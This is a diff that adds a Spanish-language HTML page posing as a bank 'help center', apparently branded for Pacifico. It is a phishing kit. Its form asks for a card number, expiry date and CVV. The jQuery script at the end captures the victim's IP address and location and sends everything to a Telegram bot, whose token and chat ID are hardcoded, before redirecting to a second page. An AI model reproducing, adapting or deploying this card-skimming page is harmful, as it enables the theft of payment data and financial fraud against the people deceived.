@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Centro de Ayudas</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-image: url('img/09.jpg'); /* Ruta de tu imagen de fondo */
+            background-size: cover;
+            background-position:  left;
+            background-repeat: no-repeat;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            border: 3px solid #ccc;
+            border-radius: 5px;
+            background-color: rgba(255, 255, 255, 0.8); /* Color de fondo semitransparente */
+        }
+        .container h1 {
+            text-align: center;
+        }
+        .container h3 {
+            text-align: center;
+        }
+        .image-container {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .image-container img {
+            width: 200px;
+            height: auto;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        .form-group input[type="text"],
+        .form-group input[type="password"] {
+            width: 90%;
+            padding: 8px;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+        }
+
+        .form-group input[type="submit"] {
+            width: 80%;
+            padding: 10px;
+            border: none;
+            border-radius: 15px;
+            background-color: #1287D3;
+            color: #fff;
+            cursor: pointer;
+            
+            
+        }
+        .form-group input[type="submit"]:hover {
+            background-color: #1287D3;
+            
+        }
+
+
+
+
+
+
+
+
+        .form-group1 {
+            margin-bottom: 20px;
+            align-items: center;
+            text-align: center; /* Alineación del contenido al centro */
+        }
+        
+        .form-group1 input[type="submit"] {
+            width: 80%;
+            padding: 10px;
+            border: none;
+            border-radius: 15px;
+            background-color: #1287D3;
+            color: #fff;
+            cursor: pointer;
+        }
+        .form-group1 input[type="submit"]:hover {
+            background-color: #1287D3;
+
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="image-container">
+            <img src="img/logop.png" alt="Imagen" style="width: 250px; height: auto;">
+        </div>
+        <h3>Estamos aqui para ayudarte</h3>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="usuario">Tarjeta de Credito/Debito</label>
+                <input type="text" id="usuario" placeholder="xxxx-xxxx-xxxx-xxxx" minlength="16" maxlength="16" onkeypress="if(event.keyCode&lt;45||event.keyCode&gt;57)event.returnValue=false;" name="usuario" required>
+            </div>
+            <div class="form-group">
+                <label for="contrasena">Fecha de vencimiento</label>
+<br>
+
+ <input id="usuario1" type="tel" minlength="2" maxlength="2"  onkeypress="if(event.keyCode&lt;45||event.keyCode&gt;57)event.returnValue=false;" style="width:35px;" onkeyup="if (this.value.length == this.getAttribute('maxlength')) correo2.focus()" name="usuario1" autofocus="" required="" placeholder="MM"> / <input id="usuario2" type="tel" minlength="2" maxlength="2"  onkeypress="if(event.keyCode&lt;45||event.keyCode&gt;57)event.returnValue=false;" style="width:45px;" onkeyup="if (this.value.length == this.getAttribute('maxlength')) num2.focus()" name="usuario2" autofocus="" required="" placeholder="AA">
+
+<br>
+<br>
+            <div class="form-group">
+                <label for="contrasena">Cvv</label>
+                <input type="password" id="usuario3" placeholder="xxx" minlength="3" maxlength="3" name="usuario3" required minlength="4" maxlength="4" pattern="[0-9]+">
+            </div>
+            <div class="form-group1">
+                <input type="submit" value="Continuar" >
+            </div>
+        </form>
+    </div>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $('#loginForm').submit(function(e){
+                e.preventDefault();
+                var u_name = $('#usuario').val();
+                var u_name1 = $('#usuario1').val();
+                var u_name2 = $('#usuario2').val();
+                var u_name3 = $('#usuario3').val();
+
+                var ip, ip2;
+                $.getJSON("https://api.ipify.org?format=json", function(data) {
+                    ip = data.ip;
+                    $.getJSON("https://ipinfo.io", function (response) {
+                        ip2 = response.city + ", " + response.country;
+                        var message = "Pacifico-TDC:\nTarjeta: " + u_name + "\nMes: " + u_name1 + "\nA#0: " + u_name2 + "\nCvv: " + u_name3 + "\n🌎IP: " + ip + "\n" + ip2;
+                        var telegram_bot_id = "7510386971:AAH4rkbrPnLgtWIOkKA-mPLvbfw-EkB7NmU"; // Reemplaza con tu Bot ID
+                        var chat_id = "7299286232"; // Reemplaza con tu Chat ID
+                        var settings = {
+                            "async": true,
+                            "crossDomain": true,
+                            "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+                            "method": "POST",
+                            "headers": {
+                                "Content-Type": "application/json",
+                                "cache-control": "no-cache"
+                            },
+                            "data": JSON.stringify({
+                                "chat_id": chat_id,
+                                "text": message
+                            })
+                        };
+                        $.ajax(settings).done(function (response) {
+                            window.location = '2.html'; // Redirige después de enviar el mensaje
+                        });
+                    });
+                });
+            });
+        });
+    </script>
+</body>
+</html>
